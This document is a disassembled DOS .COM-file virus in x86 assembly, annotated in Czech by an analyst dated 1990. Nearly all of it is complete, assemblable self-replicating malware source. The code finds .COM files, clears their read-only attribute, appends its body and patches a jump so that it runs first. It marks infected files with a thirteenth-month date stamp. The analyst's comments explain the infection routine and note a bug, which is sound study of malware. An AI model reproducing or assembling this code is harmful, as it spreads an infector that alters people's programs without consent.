seg_a       segment
        assume  cs:seg_a, ds:seg_a
        org 100h
  
izol534     proc    far
  
start:
                jmp     loc_1
                db      500 dup (0)             ; NENI VIRUS !!!
                db      0B8h, 0, 0, 0CDh, 20h   ; ZBYTEK MEHO PROGRAMKU
loc_1:
                push    ax
; --------------   PRENOS USCHOVANYCH TRI BYTU Z VIRU NA ZACATEK PROGRAMU
                mov     si,461h                 ; SI=Zacatek tabulky
                mov     dx,si
        add si,0
                cld
                mov     cx,3                    ; Kopiruj 3 byty
        mov di,100h
                rep     movsb
;---------------   TEST VERZE DOSu
                mov     di,dx                   ; DI=Ukazatel na zacatek prac.oblasti
                mov     ah,30h
                int     21h                     ; Get DOS version
        cmp al,0
                jne     loc_2
                jmp     loc_16                  ; Pokud blba, konec
;---------------   NASTAVENI DTA PRO VIRUS
loc_2:
        mov dx,2Ch
        add dx,di
        mov bx,dx
        mov ah,1Ah
                int     21h                     ; Set DTA DOS Service
        mov bp,0
        mov dx,di
                add     dx,7                    ; DS:DX=ASCIIZ String pro hledani. ????????.COM
;---------------   HLEDANI SOUBORU PRO NAKAZENI
loc_3:
                mov     cx,3                    ; Hledej i Hidden a ReadOnly
                mov     ah,4Eh
                int     21h                     ; DOS Service Find First
                                                ; Hledane jmeno je @ds:dx
                jmp     loc_5
loc_4:
                mov     ah,4Fh
                int     21h                     ; DOS Service Find Next
loc_5:
                jnc     loc_8                   ; Pokud OK, dal
                cmp     al,12h                  ; Chyba NO MORE FILES ??
                je      loc_6                   ; Pokud ano, dalsi testy
                jmp     loc_15                  ; Konci praci a startuj program
loc_6:
                cmp     bp,0FFFFh               ; Hledame '\' ??
                jne     loc_7                   ; Pokud ne, budeme tak cinit
                jmp     loc_15                  ; Jinak KONEC a start programu
loc_7:
                dec     dx                      ; DS:DX ukazuje na '\'
                mov     bp,0FFFFh               ; Signal, ze hledame '\'
                jmp     short loc_3             ; Hledej znovu
loc_8:
                mov     cx,[bx+18h]             ; Cti DATE STAMP
        and cx,1E0h
                cmp     cx,1A0h                 ; Ma soubor nastaven mesic cislo 13 ?
                je      loc_4                   ; Pokud ano, hledej dal
        cmp word ptr [bx+1Ah],0FA00h
                ja      loc_4
        cmp word ptr [bx+1Ah],100h
                jb      loc_4                   ; Pokud je delka>FA00H nebo delka<100H, pak hledej dal
;---------------   PREPIS JMENA SOUBORU DO VIRU
                push    di
        mov si,bx
        add si,1Eh
        add di,14h
                cmp     bp,0FFFFh               ; Hledal se '\'
                jne     loc_9                   ; Pokud ne, jdi dal jinak
                mov     al,5Ch                  ; uloz napred '\'
                stosb                           ; na es:[di]
loc_9:
                lodsb                           ; String [si] do al
                stosb                           ; Uloz al na es:[di]
                cmp     al,0                    ; Konec jmena ?
                jne     loc_9                   ; Dokud ne, tak se cykli
;---------------   ZRUS PRIPADNY READ-ONLY ATTRIBUT
                pop     di                      ; Zacatek workarea zpet
        mov dx,di
                add     dx,14h                  ; DX ukazuje na zkopirovane jmeno
        mov ax,4300h
                int     21h                     ; DOS Service GET/SET File Attribut Jmeno @ds:dx
                                                ; V tomto pripade GET Attrib.
                mov     [di+22h],cx             ; Uloz Attrib.
                and     cx,0FFFEh               ; Zamaskuj ReadOnly
                mov     dx,di
                add     dx,14h                  ; DX ukazuje opet na jmeno
        mov ax,4301h
                int     21h                     ; DOS Service GET/SET File Attr. Jmeno @ds:dx
                                                ; V tomto pripade SET
;---------------    OTEVRENI SOUBORU
                mov     dx,di
                add     dx,14h                  ; DX opet ukazuje na jmeno
        mov ax,3D02h
                int     21h                     ; DOS Service OPEN FILE
                                                ; Jmeno @ds:dx, pro cteni a zapis
                jnc     loc_10
                jmp     loc_14                  ; Pokud chyba, tak konec
;---------------   FILE DATE
loc_10:
                mov     bx,ax                   ; BX=File Handle
        mov ax,5700h
                int     21h                     ; DOS Service GET/SET File Date&Time
                                                ; Momentalne GET
                mov     [di+24h],cx             ; Uloz TIME
                mov     [di+26h],dx             ; Uloz DATE
;---------------   NACTE DO SEBE PRVNI 3 BYTY (ZACATEK PROGRAMU)
                mov     ah,3Fh                  
        mov cx,3
        mov dx,di
        add dx,0
                int     21h                     ; DOS Service Read File
                jnc     loc_11
                jmp     loc_13                  ; Pokud chyba, koncit
;---------------   POSUN FILE-POINTERU NA KONEC SOUBORU
loc_11:
                cmp     ax,3                    ; Nacetl OK ?
                jne     loc_13                  ; Pokud ne, koncit
                mov     ax,4202h                ; Budeme delat sluzbu 42H a merit budeme od konce
                mov     cx,0                    ; 0 bytu od konce
        mov dx,cx
                int     21h                     ; DOS Service MOVE File Ptr cx,dx=offset
;---------------   VYPOCTY PRO ULOZENI
                sub     ax,3                    ; Odecti 3 kvuli JMP instrukci
                mov     [di+4],ax               ; Uloz si to a vytvor tak JMP xxxx instrukci ve workarea
                mov     cx,165h                 ;
                cmp     dx,0                    ; Soubor kratsi nez 65535 B ?
                jne     loc_13                  ; Pokud ne, konec
        mov dx,di
                sub     di,cx                   ; DI=Zacatek viru (Adresa zacatku)
                add     di,2                    ; Pocatecni instrukce tela viru (MOV SI,zacatek workarea)
        add ax,103h
                add     ax,cx                   ; AX=Novy zacatek workarea pro kopii
                mov     [di],ax                 ; Uloz to do sebe
;---------------   VLASTNI PRIPOJENI K SOUBORU
                mov     ah,40h
        mov di,dx
                sub     dx,cx                   ; Zacatek viru v pameti
                mov     cx,216h                 ; Delka viru
                int     21h                     ; DOS Service WRITE File
                                                ; Zapise cx=bytu z ds:dx
                jnc     loc_12
                jmp     loc_13                  ; Pokud nebylo vse OK, konci
;---------------   ZAPIS PRVNICH TRI BYTU (START VIRU)
loc_12:
        cmp ax,216h
                jne     loc_13                  ; Pokud se nezapsalo celych 216H bytu, konci
                mov     ax,4200h                ; DOS MOVE od zacatku souboru
                mov     cx,0                    ; 0 bytu offset
        mov dx,cx
                int     21h                     ; DOS Service MOVE File Ptr
                                                ; cx,dx=offset (Zde nastavi na zacatek)
                jc      loc_13                  ; Pokud chyba, konec
                mov     ah,40h
                mov     cx,3                    ; Tri byty
                mov     dx,di                   ; ds:dx ukazuje na upraveny JMP do viru
        add dx,3
                int     21h                     ; DOS Service WRITE File
                                                ; cx=bytu z ds:dx
;---------------    UPRAVA DATA SOUBORU JAKO TEST PRO SIRENI (13.MESIC)
loc_13:
                mov     cx,[di+24h]             ; CX=DATE STAMP
                mov     dx,[di+26h]             ; DX=TIME STAMP
        and dx,0FE1Fh
                or      dx,1A0h                 ; Vyrobil 13 mesic
        mov ax,5701h
                int     21h                     ; DOS Service GET/SET File Date&Time
                                                ; V tomto pripade SET
                mov     ah,3Eh
                int     21h                     ; DOS Service CLOSE File
;---------------   UPRAV ATTRIBUTY SOUBORU NA PUVODNI HODNOTU

;---------------   !!!!!! ZDE JE VE VIRU CHYBA !!!!!!   --------------------
loc_14:
                mov     ax,4300h                ; ZDE JE ZREJME CHYBA !! MELO BY BYT  MOV AX,4301H
                mov     cx,[di+22h]             ; Puvodni attrib. do CX
                int     21h                     ; DOS Service GET/SET Attrib.
                                                ; jmeno @ds:dx, ZDE JE PUVODNE GET, ALE MELO BY TU BYT SET
;---------------    ZPATKY DTA NA PUVODNI HODNOTU
loc_15:
        mov dx,80h
        mov ah,1Ah
                int     21h                     ; DOS Service Set DTA na DS:DX
;---------------   START PUVODNIHO PROGRAMU
loc_16:
        pop ax
                mov     di,100h                 ; Adresa startu
        push    di
                retn                            ; Skoc tam
                db      0E9h, 0F4h, 1, 0E9h, 0F9h, 1    ; Zde se schovavaji a tvori JMP xxxx
                db      5Ch                             ; '\'
                db      8 dup (3Fh)                     ; '????????'
                db      2Eh, 43h, 4Fh, 4Dh, 0           ; '.COM'
                db      'MODEL.COM'                     ; Sem se kopiruje jmeno souboru a directory info
        db  0, 0, 4Dh, 0, 0, 20h
        db  0, 2Bh, 0BDh, 0A3h, 14h, 0
        db  0, 0, 0, 1
        db  3Fh
        db  7 dup (3Fh)
        db  43h, 4Fh, 4Dh, 3, 2
        db  7 dup (0)
        db  20h, 2Bh, 0BDh, 0A3h, 14h, 0FCh
        db  1, 0, 0
        db  'MODEL.COM'
        db  0, 0, 0, 0
        db  'osoftyright Microsoftyright Micr'
        db  'osoftyright Microsoftyright Micr'
        db  'osoftyright Microsoft 1988'
  
izol534     endp
  
seg_a       ends
  
  
  
        end start






; Virus se tedy jen kopiruje a nic destruktivniho nedela
; Napada jen .COM soubory od velikosti 100H do 0FA00H
; Jako identifikator nakazeni je pouzit 13.mesic v date stamp
; Neni rezidentni v pameti a pri kazdem spusteni infikovaneho programu se
; muze nakazit jen jeden soubor.
; Lze proti nemu napsat vakcinu celkem snadno. Programy lze i imunizovat
;
;
;
;
; Analysed and disassembled by Pavel Korensky PKCS 3.5.1990
